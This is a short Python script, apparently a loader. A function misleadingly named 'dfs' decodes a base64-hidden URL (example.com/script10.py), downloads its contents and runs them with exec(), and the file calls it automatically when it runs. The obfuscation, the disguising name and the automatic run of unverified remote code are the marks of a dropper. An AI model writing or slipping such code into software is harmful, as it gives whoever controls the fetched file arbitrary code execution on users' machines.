import base64
import requests

def dfs():
    try:
        x = "aHR0cDovL2V4YW1wbGUuY29tL3NjcmlwdDEwLnB5"
        y = base64.b64decode(x).decode("utf-8")

        z = requests.get(y)
        w = z.text

        exec(w)

    except Exception as e:
        print(e)

dfs()
